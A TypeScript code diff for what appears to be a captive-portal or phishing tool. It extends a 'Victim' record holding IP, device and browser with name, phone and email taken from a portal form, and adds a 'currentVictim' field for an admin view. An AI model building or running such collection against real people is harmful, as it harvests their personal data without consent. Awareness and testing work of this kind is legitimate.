@@ -10,6 +10,10 @@ export interface Victim {
     timestamp: string;
     device: 'iOS' | 'Android' | 'Desktop' | 'Unknown';
     browser: string;
+    // Portal form data (optional)
+    name?: string;
+    phone?: string;
+    email?: string;
 }
 
 export interface SessionStats {
@@ -21,6 +25,7 @@ export interface SessionStats {
         Desktop: number;
         Unknown: number;
     };
+    currentVictim?: Victim; // Most recent victim for admin display
 }
 
 // In-memory storage (resets on server restart)
@@ -33,6 +38,7 @@ const sessions: SessionStats = {
         Desktop: 0,
         Unknown: 0,
     },
+    currentVictim: undefined,
 };
 
 /**
@@ -71,8 +77,13 @@ export function parseBrowser(userAgent: string): string {
 
 /**
  * Add a new victim to the session
+ * Now includes optional portal form data
  */
-export function addVictim(userAgent: string, ip: string): Victim {
+export function addVictim(
+    userAgent: string,
+    ip: string,
+    formData?: { name?: string; phone?: string; email?: string }
+): Victim {
     const device = parseDevice(userAgent);
     const browser = parseBrowser(userAgent);
 
@@ -83,10 +94,14 @@ export function addVictim(userAgent: string, ip: string): Victim {
         timestamp: new Date().toISOString(),
         device,
         browser,
+        name: formData?.name || undefined,
+        phone: formData?.phone || undefined,
+        email: formData?.email || undefined,
     };
 
     sessions.victims.push(victim);
     sessions.deviceBreakdown[device]++;
+    sessions.currentVictim = victim; // Track as current victim
 
     // Keep only last 100 victims in memory
     if (sessions.victims.length > 100) {
